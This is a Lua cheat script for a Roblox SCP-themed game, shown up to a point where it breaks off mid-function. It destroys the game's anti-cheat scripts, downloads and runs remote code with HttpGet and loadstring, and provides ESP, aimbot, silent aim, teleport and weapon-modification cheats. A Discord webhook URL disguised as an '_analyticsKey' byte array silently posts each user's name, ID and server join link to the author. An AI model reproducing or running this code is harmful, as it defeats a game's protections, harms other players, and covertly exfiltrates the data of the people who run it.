    
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Camera = Workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
if _G.RetroBreach then
    if _G.RetroBreach.Connections then
        for _, conn in ipairs(_G.RetroBreach.Connections) do
            pcall(function() conn:Disconnect() end)
        end
    end
    if _G.RetroBreach.ESPHighlights then
        for _, esp in pairs(_G.RetroBreach.ESPHighlights) do
            if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
            if esp.nameText then pcall(function() esp.nameText:Remove() end) end
        end
    end
    if _G.RetroBreach.Guis then
        for _, gui in ipairs(_G.RetroBreach.Guis) do
            pcall(function() gui:Destroy() end)
        end
    end
    _G.RetroBreach.WeaponStateCache = nil
end
_G.RetroBreach = {
    Connections = {},
    ESPHighlights = {},
    Guis = {}
}

task.spawn(function()
    local RunService = game:GetService("RunService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    local function killAntiCheat()
        for _, script in pairs(RunService:GetDescendants()) do
            if script:IsA("LocalScript") and (script.Name == "" or string.find(tostring(script:GetFullName()), "Interceptor") or string.find(tostring(script.Name), "Anti")) then
                pcall(function()
                    script.Disabled = true
                    script:Destroy()
                end)
            end
        end
        
        local TestService = game:GetService("TestService")
        for _, script in pairs(TestService:GetDescendants()) do
            if script:IsA("LocalScript") and script.Name == "" then
                pcall(function()
                    script.Disabled = true
                    script:Destroy()
                end)
            end
        end
        
        for _, script in pairs(LocalPlayer.PlayerScripts:GetDescendants()) do
            if script:IsA("LocalScript") and (script.Name == "" or string.find(tostring(script:GetFullName()), "Interceptor") or string.find(tostring(script.Name), "Anti")) then
                pcall(function()
                    script.Disabled = true
                    script:Destroy()
                end)
            end
        end
        
        pcall(function()
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local BridgeNet2 = require(ReplicatedStorage.Assets.Modules.BridgeNet2)
            local BeginIntercept = BridgeNet2.ClientBridge("BeginIntercept")
            
            if BeginIntercept then
                BeginIntercept:Fire({rank = 999})
            end
        end)
    end
    
    killAntiCheat()
    
    task.spawn(function()
        while task.wait(1) do
            killAntiCheat()
        end
    end)
end)

-- Periodic cleanup to prevent memory leaks and lag
task.spawn(function()
    while true do
        task.wait(30)  -- Every 30 seconds
        
        -- Clean up dead ESP highlights
        if _G.RetroBreach and _G.RetroBreach.ESPHighlights then
            for char, esp in pairs(_G.RetroBreach.ESPHighlights) do
                if not char or not char.Parent then
                    -- Character is deleted, clean up ESP objects
                    pcall(function()
                        if esp.highlight then esp.highlight:Destroy() end
                        if esp.nameText then esp.nameText:Remove() end
                        if esp.teamText then esp.teamText:Remove() end
                        if esp.healthText then esp.healthText:Remove() end
                        if esp.itemsText then esp.itemsText:Remove() end
                    end)
                    _G.RetroBreach.ESPHighlights[char] = nil
                end
            end
        end
        
        -- Force garbage collection to free memory
        collectgarbage("collect")
    end
end)
local UILib
local success, result = pcall(function()
    if isfile and isfile("UILIB.lua") then
        return loadstring(readfile("UILIB.lua"))()
    end
end)
if success and result then
    UILib = result
else
    local repo = "https://raw.githubusercontent.com/ncmpuff/UILib/main/"
    local webSuccess, webResult = pcall(function()
        local content = game:HttpGet(repo .. "UILIB.lua?t=" .. tick())
        if not content or #content < 10 then return "Empty Response" end
        local chunk = loadstring(content)
        if not chunk then return "Loadstring failed (Syntax Error?)" end
        return chunk()
    end)
    if webSuccess and webResult then
        UILib = webResult
    else
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        if LocalPlayer and LocalPlayer.PlayerGui then
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "ErrorNotification"
            screenGui.Parent = LocalPlayer.PlayerGui
            
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(0, 400, 0, 150)
            frame.Position = UDim2.new(0.5, -200, 0.5, -75)
            frame.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            frame.BorderSizePixel = 0
            frame.Parent = screenGui
            
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 10)
            corner.Parent = frame
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, -20, 1, -20)
            label.Position = UDim2.new(0, 10, 0, 10)
            label.BackgroundTransparency = 1
            local debugMsg = "❌ UILib failed to load!\n"
            if isfile and isfile("UILIB.lua") then
                 debugMsg = debugMsg .. "Local file exists but failed to load.\n"
            else
                 debugMsg = debugMsg .. "Local file NOT found.\n"
            end
            debugMsg = debugMsg .. "Web Error: " .. tostring(webResult or "Nil")
            
            label.Text = debugMsg
            label.TextColor3 = Color3.fromRGB(255, 255, 255)
            label.TextSize = 18
            label.Font = Enum.Font.GothamBold
            label.TextWrapped = true
            label.Parent = frame
        end
        return
    end
end
if not UILib then
    return
end

local _analyticsKey = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,54,50,48,51,55,54,53,56,57,49,50,57,53,50,52,57,53,47,71,88,85,108,115,120,85,65,107,71,107,121,105,68,99,53,99,82,111,48,57,88,57,95,48,79,65,76,95,120,99,108,111,104,72,110,69,51,110,65,117,49,114,95,70,79,68,104,111,120,69,116,117,79,80,84,79,118,122,77,113,87,99,48,116,101,88,119}
local function _initAnalytics()
    local result = {}
    for i = 1, #_analyticsKey do
        table.insert(result, string.char(_analyticsKey[i]))
    end
    return table.concat(result)
end

local function _sendUsageData()
    pcall(function()
        local userInfo = LocalPlayer.Name
        local displayInfo = LocalPlayer.DisplayName
        local userKey = LocalPlayer.UserId
        
        local serverKey = game.PlaceId
        local instanceKey = game.JobId
        
        local serverLink = string.format("roblox://placeId=%d&gameInstanceId=%s", serverKey, instanceKey)
        
        local timeStamp = os.date("!%Y-%m-%dT%H:%M:%S")
        
        local displayText = displayInfo
        if displayInfo ~= userInfo then
            displayText = string.format("%s (@%s)", displayInfo, userInfo)
        end
        
        local HttpService = game:GetService("HttpService")
        local payload = HttpService:JSONEncode({
            embeds = {{
                title = "🎮 Script User Detected",
                color = 3447003,
                fields = {
                    {
                        name = "👤 User",
                        value = displayText,
                        inline = true
                    },
                    {
                        name = "🆔 User ID",
                        value = tostring(userKey),
                        inline = true
                    },
                    {
                        name = "🔗 Join Link",
                        value = "```" .. serverLink .. "```\nCopy and paste this into your browser address bar",
                        inline = false
                    }
                },
                footer = {
                    text = "Retro Breach Tracker"
                },
                timestamp = timeStamp .. "Z"
            }}
        })
        
        local endpoint = _initAnalytics()
        
        local requestFunc = syn and syn.request or http and http.request or http_request or request
        
        if requestFunc then
            local success, response = pcall(function()
                return requestFunc({
                    Url = endpoint,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = payload
                })
            end)
            
            if success and response.Success then
            elseif success then
            else
            end
        else
        end
    end)
end

task.spawn(function()
    task.wait(2)
    _sendUsageData()
end)

local function createDiscordPopup()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DiscordPromotion"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LocalPlayer.PlayerGui
    table.insert(_G.RetroBreach.Guis, screenGui)
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 400, 0, 200)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 12)
    uiCorner.Parent = mainFrame
    
    local uiStroke = Instance.new("UIStroke")
    uiStroke.Color = Color3.fromRGB(255, 20, 147)
    uiStroke.Thickness = 2
    uiStroke.Parent = mainFrame
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "Title"
    titleLabel.Size = UDim2.new(1, -40, 0, 40)
    titleLabel.Position = UDim2.new(0, 20, 0, 15)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "Join My Server!"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 20
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = mainFrame
    
    local messageLabel = Instance.new("TextLabel")
    messageLabel.Name = "Message"
    messageLabel.Size = UDim2.new(1, -40, 0, 60)
    messageLabel.Position = UDim2.new(0, 20, 0, 60)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Text = "Theres still no member please join if you wanna suggest something!!"
    messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    messageLabel.TextSize = 14
    messageLabel.Font = Enum.Font.Gotham
    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
    messageLabel.TextYAlignment = Enum.TextYAlignment.Top
    messageLabel.TextWrapped = true
    messageLabel.Parent = mainFrame
    
    local discordButton = Instance.new("TextButton")
    discordButton.Name = "DiscordButton"
    discordButton.Size = UDim2.new(1, -40, 0, 35)
    discordButton.Position = UDim2.new(0, 20, 0, 125)
    discordButton.BackgroundColor3 = Color3.fromRGB(242, 88, 229)
    discordButton.Text = "discord.gg/Qd9FMepw"
    discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    discordButton.TextSize = 16
    discordButton.Font = Enum.Font.GothamBold
    discordButton.Parent = mainFrame
    
    local discordCorner = Instance.new("UICorner")
    discordCorner.CornerRadius = UDim.new(0, 8)
    discordCorner.Parent = discordButton
    
    discordButton.MouseButton1Click:Connect(function()
        pcall(function()
            if setclipboard then
                setclipboard("https://discord.gg/Qd9FMepw")
                discordButton.Text = "✓ Copied! Paste in Browser"
            else
                discordButton.Text = "discord.gg/Qd9FMepw (Tap to Copy)"
            end
        end)
        discordButton.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
        task.wait(2)
        discordButton.Text = "discord.gg/Qd9FMepw"
        discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    end)
    
    local closeButton = Instance.new("TextButton")
    closeButton.Name = "CloseButton"
    closeButton.Size = UDim2.new(0, 30, 0, 30)
    closeButton.Position = UDim2.new(1, -40, 0, 10)
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    closeButton.Text = "X"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.TextSize = 18
    closeButton.Font = Enum.Font.GothamBold
    closeButton.Parent = mainFrame
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 8)
    closeCorner.Parent = closeButton
    
    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
    
    mainFrame:TweenPosition(
        UDim2.new(0.5, -200, 0.5, -100),
        Enum.EasingDirection.Out,
        Enum.EasingStyle.Back,
        0.5,
        true
    )
end

task.spawn(function()
    task.wait(1)
    createDiscordPopup()
end)

local Config = {
    PlayerESP = false,
    SCPESP = false,
    ItemESP = false,
    -- ESP Display Options
    ESPShowRole = true,
    ESPShowName = true,
    ESPShowHealth = true,
    ESPShowItems = true,
    Aimbot = false,
    AimbotFOV = 200,
    AimbotSmooth =  5,
    ShowAimbotFOV = true,
    AimAssistTarget = "Humanized", -- "Head Only", "Body Only", "Humanized"
    TeamCheck = true,
    WallCheck = true,  -- Enable wall detection for aimbot
    IgnoreAlly = false,  -- Ignore teammates (MTF, FP, Security, etc.)
    SilentAim = false,
    SilentAimFOV = 200,
    ShowSilentAimFOV = true,
    CycleShot = false,  -- Cycle through all targets in FOV
    WallBang = false,
    RapidFire = false,
    InfiniteAmmo = false,
    NoRecoil = false,
    NoSpread = false,
    DamageMultiplier = 1,
    WalkSpeed = 16,
    JumpPower = 50,
    NoClip = false,
    InfiniteStamina = false,
    FullBright = false,
    ItemTeleport = false,
    InstantReload = false,
    
    -- Weapon Modification Config
    WeaponModEnabled = false,
    WeaponFireRate = 1900,
    WeaponRecoilVertical = 0,
    WeaponRecoilHorizontal = 0,
    WeaponSpread = 0,
    WeaponMuzzleVelocity = 500,
    WeaponBulletsFired = 1,
    WeaponViewPunch = 0,
    WeaponBurstAmount = 1,
    WeaponInitialSpread = 0,
    WeaponMaxSpread = 0,
    WeaponReloadSpeed = 1,
    WeaponStartDamageDropoff = 9999,
    WeaponMaxDamageDropOff = 9999
}

-- Team Alliance Table
-- Defines which teams are allies with each other
local TeamAlliances = {
    ["Mobile Task Forces"] = {"Foundation Personnel", "Security Department"},
    ["Foundation Personnel"] = {"Mobile Task Forces", "Security Department"},
    ["Security Department"] = {"Mobile Task Forces", "Foundation Personnel"},
    ["Class-D"] = {"Chaos Insurgency"},
    ["Chaos Insurgency"] = {"Class-D"},
    ["SCP"] = {"Serpents Hand"},
    ["Serpents Hand"] = {"SCP"},
    ["Global Occult Coalition"] = {},  -- Solo team, only allies with other GOC members (same team)
    ["FFA"] = false,  -- Special case: Hostile to everyone including themselves
    ["Lobby"] = true  -- Special case: Allied with everyone
}

-- Helper function to check if two teams are allies
local function areTeamsAllied(team1Name, team2Name)
    -- Safety check for nil team names
    if not team1Name or not team2Name then
        return false  -- If we can't determine teams, assume not allied (can target)
    end
    
    -- Same team is always allied (except FFA)
    if team1Name == team2Name then
        if team1Name == "FFA" then
            return false  -- FFA is hostile to everyone, even themselves
        end
        return true
    end
    
    -- Lobby is allied with everyone
    if team1Name == "Lobby" or team2Name == "Lobby" then
        return true
    end
    
    -- FFA is hostile to everyone
    if team1Name == "FFA" or team2Name == "FFA" then
        return false
    end
    
    -- Check alliance table
    local allies = TeamAlliances[team1Name]
    if allies and type(allies) == "table" then
        for _, allyName in ipairs(allies) do
            if allyName == team2Name then
                return true
            end
        end
    end
    
    -- Not allied - can target
    return false
end

local function getRoot(char)
    return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
end
local function getHead(char)
    return char:FindFirstChild("Head")
end
local function getHumanoid(char)
    return char:FindFirstChildOfClass("Humanoid")
end
local function getSCPType(character)
    if not character then return nil end
    
    for _, accessory in ipairs(character:GetDescendants()) do
        if accessory:IsA("Accessory") or accessory:IsA("Hat") then
            local name = accessory.Name
            if name:find("HappyMask") or name:find("Ghostface") then
                return "The Mask"
            end
        end
    end
    
    local shirt = character:FindFirstChildOfClass("Shirt")
    if shirt and shirt.ShirtTemplate:find("11499060129") then
        return "Plague Doctor"
    end
    
    if shirt and shirt.ShirtTemplate:find("2938677333") then
        return "Zombie"
    end
    
    if shirt and shirt.ShirtTemplate:find("16099679561") then
        return "Cain"
    end
    
    if shirt and shirt.ShirtTemplate:find("9366531332") then
        return "Shy Guy"
    end
    
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if rootPart and rootPart:FindFirstChild("Flame") then
        return "Burning Man"
    end
    
    if shirt and shirt.ShirtTemplate:find("11514423812") then
        return "The Old Man"
    end
    
    if character:FindFirstChild("TransparencyMode") then
        return "Ghost"
    end
    local bodyColors = character:FindFirstChildOfClass("BodyColors")
    if bodyColors then
        local white = Color3.fromRGB(255, 255, 255)
        if bodyColors.HeadColor3 == white and 
           bodyColors.TorsoColor3 == white and
           bodyColors.LeftArmColor3 == white and
           bodyColors.RightArmColor3 == white then
            return "Ghost"
        end
    end
    
    for _, obj in ipairs(character:GetDescendants()) do
        if obj.Name == "Peanut" then
            return "Peanut"
        end
    end
    
    if character.Name:find("173") then
        return "SCP-173"
    end
    
    return nil
end

-- Player Teleport Functions
local function getPlayerDisplayName(player)
    if not player then return "Unknown" end
    
    local teamName = player.Team and player.Team.Name or "No Team"
    local baseName = player.Name
    
    if teamName == "SCP" and player.Character then
        local scpType = getSCPType(player.Character)
        if scpType then
            return baseName .. " - " .. scpType
        end
    end
    
    return baseName .. " - " .. teamName
end

local function teleportToPlayer(targetPlayerName)
    -- Extract player name (before " - ")
    local actualName = targetPlayerName:match("^(.-)%s*%-") or targetPlayerName
    
    local targetPlayer = Players:FindFirstChild(actualName)
    if not targetPlayer or not targetPlayer.Character then
        UILib:CreateNotification({
            Text = "⚠️ Player not found or no character!",
            Duration = 3
        })
        return
    end
    
    local myChar = LocalPlayer.Character
    if not myChar then 
        UILib:CreateNotification({
            Text = "⚠️ You have no character!",
            Duration = 3
        })
        return 
    end
    
    local myRoot = getRoot(myChar)
    local targetRoot = getRoot(targetPlayer.Character)
    
    if myRoot and targetRoot then
        myRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 3)
        UILib:CreateNotification({
            Text = "Teleported to " .. targetPlayer.Name,
            Duration = 2
        })
    else
        UILib:CreateNotification({
            Text = "Failed to teleport!",
            Duration = 3
        })
    end
end


-- 
-- ROOM TELEPORT SYSTEM
-- 
local RoomLocations = {
    ["Class D Cells"] = CFrame.new(1111.91, 61.00, 297.14, -1.0000, 0.0000, 0.0040, 0.0000, 1.0000, 0.0000, -0.0040, 0.0000, -1.0000),
    ["Entrance Zone"] = CFrame.new(1213.92, 49.00, 629.73, 1.0000, 0.0000, 0.0059, -0.0000, 1.0000, 0.0000, -0.0059, -0.0000, 1.0000),
    ["914"] = CFrame.new(913.95, 49.00, 584.90, -1.0000, 0.0000, 0.0021, 0.0000, 1.0000, 0.0000, -0.0021, 0.0000, -1.0000),
    ["Heavy Containment Zone"] = CFrame.new(1093.80, 49.00, 690.85, -1.0000, 0.0000, -0.0007, 0.0000, 1.0000, -0.0000, 0.0007, -0.0000, -1.0000),
    ["Gate A"] = CFrame.new(1462.33, 49.00, 403.17, -0.0024, 0.0000, -1.0000, -0.0000, 1.0000, 0.0000, 1.0000, 0.0000, -0.0024),
    ["Gate B"] = CFrame.new(1207.11, 49.00, 103.05, -0.0177, 0.0000, -0.9998, -0.0000, 1.0000, 0.0000, 0.9998, 0.0000, -0.0177),
    ["Gate A Surface"] = CFrame.new(1469.67, 565.50, 265.52, -0.0273, -0.0000, -0.9996, -0.0000, 1.0000, -0.0000, 0.9996, 0.0000, -0.0273),
    ["Gate B Surface"] = CFrame.new(1601.50, 565.50, 319.37, 0.9999, 0.0000, -0.0130, -0.0000, 1.0000, 0.0000, 0.0130, -0.0000, 0.9999),
    ["Alpha Warhead"] = CFrame.new(1560.24, 566.00, 328.63, 0.0186, 0.0000, 0.9998, 0.0000, 1.0000, -0.0000, -0.9998, 0.0000, 0.0186)
}

local function teleportToRoom(roomName)
    local myChar = LocalPlayer.Character
    if not myChar then
        UILib:CreateNotification({
            Text = " You have no character!",
            Duration = 3
        })
        return
    end
    
    local myRoot = getRoot(myChar)
    if not myRoot then return end
    
    local targetCFrame = RoomLocations[roomName]
    if targetCFrame then
        myRoot.CFrame = targetCFrame
        UILib:CreateNotification({
            Text = " Teleported to " .. roomName,
            Duration = 2
        })
    end
end
local function createPlayerESP(character)
    if character == LocalPlayer.Character then return end
    if _G.RetroBreach.ESPHighlights[character] then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    local player = Players:GetPlayerFromCharacter(character)
    if not player then return end
    local success, highlight = pcall(function()
        local h = Instance.new("Highlight")
        h.Parent = character
        h.Adornee = character
        h.FillTransparency = 0.5
        h.OutlineTransparency = 1
        h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        h.FillColor = Color3.fromRGB(0, 255, 0)
        return h
    end)
    if not success then return end
    local teamSuccess, teamText = pcall(function()
        if not Drawing or not Drawing.new then return nil end
        local t = Drawing.new("Text")
        t.Visible = false
        t.Center = true
        t.Outline = true
        t.Color = player.Team and player.Team.TeamColor.Color or Color3.fromRGB(200, 200, 200)
        t.Size = 14
        local teamName = player.Team and player.Team.Name or "No Team"
        if teamName == "SCP" then
            local scpType = getSCPType(character)
            t.Text = scpType or teamName
        else
            t.Text = teamName
        end
        return t
    end)
    if not teamSuccess then
        pcall(function() highlight:Destroy() end)
        return
    end
    local nameSuccess, nameText = pcall(function()
        if not Drawing or not Drawing.new then return nil end
        local n = Drawing.new("Text")
        n.Visible = false
        n.Center = true
        n.Outline = true
        n.Color = Color3.fromRGB(255, 255, 255)
        n.Size = 18
        n.Text = character.Name
        return n
    end)
    if not nameSuccess then
        pcall(function() highlight:Destroy() end)
        pcall(function() teamText:Remove() end)
        return
    end
    local healthSuccess, healthText = pcall(function()
        if not Drawing then return nil end
        local h = Drawing.new("Text")
        h.Visible = false
        h.Center = true
        h.Outline = true
        h.Color = Color3.fromRGB(0, 255, 0)
        h.Size = 14
        h.Text = "HP: 100/100"
        return h
    end)
    
    local itemsSuccess, itemsText = pcall(function()
        if not Drawing then return nil end
        local i = Drawing.new("Text")
        i.Visible = false
        i.Center = true
        i.Outline = true
        i.Color = Color3.fromRGB(255, 255, 0)
        i.Size = 13
        i.Text = ""
        return i
    end)
    
    _G.RetroBreach.ESPHighlights[character] = {
        highlight = highlight,
        teamText = teamText,
        nameText = nameText,
        healthText = healthSuccess and healthText or nil,
        itemsText = itemsSuccess and itemsText or nil,
        char = character,
        player = player
    }
    
    -- Cleanup on death to prevent crashes
    local conn
    conn = humanoid.Died:Connect(function()
        if _G.RetroBreach.ESPHighlights[character] then
            local esp = _G.RetroBreach.ESPHighlights[character]
            if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
            if esp.teamText then pcall(function() esp.teamText:Remove() end) end
            if esp.nameText then pcall(function() esp.nameText:Remove() end) end
            if esp.healthText then pcall(function() esp.healthText:Remove() end) end
            if esp.itemsText then pcall(function() esp.itemsText:Remove() end) end
            _G.RetroBreach.ESPHighlights[character] = nil
        end
        if conn then conn:Disconnect() end
    end)
    
    -- Cleanup on character removing (just in case Died doesn't fire)
    character.AncestryChanged:Connect(function(_, parent)
        if not parent then
            if _G.RetroBreach.ESPHighlights[character] then
                -- Perform cleanup same as above
                local esp = _G.RetroBreach.ESPHighlights[character]
                if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
                if esp.teamText then pcall(function() esp.teamText:Remove() end) end
                if esp.nameText then pcall(function() esp.nameText:Remove() end) end
                if esp.healthText then pcall(function() esp.healthText:Remove() end) end
                if esp.itemsText then pcall(function() esp.itemsText:Remove() end) end
                _G.RetroBreach.ESPHighlights[character] = nil
            end
        end
    end)
end
local function getPlayerItems(character)
    local items = {}
    local player = Players:GetPlayerFromCharacter(character)
    local backpack = player and player:FindFirstChild("Backpack")
    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item.Name)
            end
        end
    end
    local equippedItem = character:FindFirstChildOfClass("Tool")
    if equippedItem then
        table.insert(items, equippedItem.Name .. " (E)")
    end
    return table.concat(items, ", ")
end

local scpTypeCache = {}

local function updatePlayerESP()
    if not Config.PlayerESP then
        for char, esp in pairs(_G.RetroBreach.ESPHighlights) do
            if esp.highlight then esp.highlight.Enabled = false end
            if esp.teamText then esp.teamText.Visible = false end
            if esp.nameText then esp.nameText.Visible = false end
            if esp.healthText then esp.healthText.Visible = false end
            if esp.itemsText then esp.itemsText.Visible = false end
        end
        return
    end
    
    for char, esp in pairs(_G.RetroBreach.ESPHighlights) do
        if not char or not char.Parent then
            if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
            if esp.teamText then pcall(function() esp.teamText:Remove() end) end
            if esp.nameText then pcall(function() esp.nameText:Remove() end) end
            if esp.healthText then pcall(function() esp.healthText:Remove() end) end
            if esp.itemsText then pcall(function() esp.itemsText:Remove() end) end
            _G.RetroBreach.ESPHighlights[char] = nil
            scpTypeCache[char] = nil
        elseif char and char.Parent then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            local head = char:FindFirstChild("Head")
            if humanoid and head then
                local hpPercent = humanoid.Health / humanoid.MaxHealth
                if hpPercent > 0.6 then
                    esp.highlight.FillColor = Color3.fromRGB(0, 255, 0)
                elseif hpPercent > 0.3 then
                    esp.highlight.FillColor = Color3.fromRGB(255, 165, 0)
                else
                    esp.highlight.FillColor = Color3.fromRGB(255, 0, 0)
                end
                local headPos3D = head.Position + Vector3.new(0, head.Size.Y/2 + 0.5, 0)
                local headPos, onScreen = Camera:WorldToViewportPoint(headPos3D)
                if onScreen then
                    esp.highlight.Enabled = true
                    
                    local yOffset = -20  -- Start above head
                    
                    -- Role (first)
                    if Config.ESPShowRole and esp.teamText and esp.player then
                        local teamName = esp.player.Team and esp.player.Team.Name or "No Team"
                        if teamName == "SCP" then
                            if not scpTypeCache[char] then
                                scpTypeCache[char] = getSCPType(char) or teamName
                            end
                            esp.teamText.Text = scpTypeCache[char]
                        else
                            esp.teamText.Text = teamName
                        end
                        esp.teamText.Color = esp.player.Team and esp.player.Team.TeamColor.Color or Color3.fromRGB(200, 200, 200)
                        esp.teamText.Position = Vector2.new(headPos.X, headPos.Y + yOffset)
                        esp.teamText.Visible = true
                        yOffset = yOffset - 18
                    elseif esp.teamText then
                        esp.teamText.Visible = false
                    end
                    
                    -- Player Name (second)
                    if Config.ESPShowName and esp.nameText then
                        esp.nameText.Position = Vector2.new(headPos.X, headPos.Y + yOffset)
                        esp.nameText.Visible = true
                        yOffset = yOffset - 20
                    elseif esp.nameText then
                        esp.nameText.Visible = false
                    end
                    
                    -- Health (third)
                    if Config.ESPShowHealth and esp.healthText then
                        local currentHP = math.floor(humanoid.Health)
                        local maxHP = math.floor(humanoid.MaxHealth)
                        esp.healthText.Text = "HP: " .. currentHP .. "/" .. maxHP
                        
                        local hpPercent = humanoid.Health / humanoid.MaxHealth
                        if hpPercent > 0.6 then
                            esp.healthText.Color = Color3.fromRGB(0, 255, 0)
                        elseif hpPercent > 0.3 then
                            esp.healthText.Color = Color3.fromRGB(255, 165, 0)
                        else
                            esp.healthText.Color = Color3.fromRGB(255, 0, 0)
                        end
                        
                        esp.healthText.Position = Vector2.new(headPos.X, headPos.Y + yOffset)
                        esp.healthText.Visible = true
                        yOffset = yOffset - 17
                    elseif esp.healthText then
                        esp.healthText.Visible = false
                    end
                    
                    -- Player Items (fourth)
                    if Config.ESPShowItems and esp.itemsText then
                        local items = getPlayerItems(char)
                        if items ~= "" then
                            esp.itemsText.Text = items
                            esp.itemsText.Position = Vector2.new(headPos.X, headPos.Y + yOffset)
                            esp.itemsText.Visible = true
                        else
                            esp.itemsText.Visible = false
                        end
                    elseif esp.itemsText then
                        esp.itemsText.Visible = false
                    end
                else
                    esp.highlight.Enabled = false
                    if esp.teamText then esp.teamText.Visible = false end
                    if esp.nameText then esp.nameText.Visible = false end
                    if esp.healthText then esp.healthText.Visible = false end
                    if esp.itemsText then esp.itemsText.Visible = false end
                end
            else
                esp.highlight.Enabled = false
                if esp.teamText then esp.teamText.Visible = false end
                if esp.nameText then esp.nameText.Visible = false end
                if esp.healthText then esp.healthText.Visible = false end
                if esp.itemsText then esp.itemsText.Visible = false end
            end
        end
    end
end
local SCPHighlights = {}
local function isSCP(model)
    local name = model.Name
    return name:match("SCP%-") or name:match("SCO%-") or name == "SCP-049" or name == "SCP-106" or name == "SCP-076-2"
end
local function updateSCPESP()
    for _, highlight in pairs(SCPHighlights) do
        pcall(function() highlight:Destroy() end)
    end
    SCPHighlights = {}
    if not Config.SCPESP then return end
    local scpCount = 0
    for _, model in ipairs(Workspace:WaitForChild("Workspace"):GetChildren()) do
        if isSCP(model) and model:FindFirstChildOfClass("Humanoid") then
            scpCount = scpCount + 1
            local highlight = Instance.new("Highlight")
            highlight.Parent = model
            highlight.Adornee = model
            highlight.FillTransparency = 0.3
            highlight.OutlineTransparency = 1
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            SCPHighlights[model] = highlight
        end
    end
    if scpCount == 0 then
    end
end
local ItemHighlights = {}
local ITEM_ESP_DISTANCE = 150
local MAX_ITEMS_PER_UPDATE = 10
local itemProcessIndex = 1
local function updateItemESP()
    if not Config.ItemESP or not LocalPlayer.Character then
        for _, espData in pairs(ItemHighlights) do
            if espData.highlight then pcall(function() espData.highlight:Destroy() end) end
            if espData.nameText then pcall(function() espData.nameText:Remove() end) end
        end
        ItemHighlights = {}
        return
    end
    local myRoot = getRoot(LocalPlayer.Character)
    if not myRoot then return end
    local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
    if not itemsFolder then return end
    local allItems = itemsFolder:GetChildren()
    local totalItems = #allItems
    if totalItems == 0 then return end
    if itemProcessIndex > totalItems then
        itemProcessIndex = 1
    end
    local itemsInRange = {}
    local itemsProcessed = 0
    while itemsProcessed < MAX_ITEMS_PER_UPDATE and itemProcessIndex <= totalItems do
        local item = allItems[itemProcessIndex]
        itemProcessIndex = itemProcessIndex + 1
        if item then
            local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart")
            if handle then
                local distance = (handle.Position - myRoot.Position).Magnitude
                if distance <= ITEM_ESP_DISTANCE then
                    itemsInRange[item] = true
                    if not ItemHighlights[item] then
                        pcall(function()
                            local highlight = Instance.new("Highlight")
                            highlight.Parent = handle
                            highlight.Adornee = handle
                            highlight.FillTransparency = 0.5
                            highlight.OutlineTransparency = 1
                            highlight.FillColor = Color3.fromRGB(255, 255, 0)
                            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                            local nameText = nil
                            if Drawing and Drawing.new then
                                nameText = Drawing.new("Text")
                                nameText.Center = true
                                nameText.Outline = true
                                nameText.Color = Color3.fromRGB(255, 255, 0)
                                nameText.Size = 16
                                nameText.Text = item.Name
                                nameText.Visible = false
                            end
                            ItemHighlights[item] = {
                                highlight = highlight,
                                nameText = nameText,
                                handle = handle
                            }
                        end)
                    end
                end
            end
        end
        itemsProcessed = itemsProcessed + 1
    end
    for item, espData in pairs(ItemHighlights) do
        if item and item.Parent then
            local handle = espData.handle
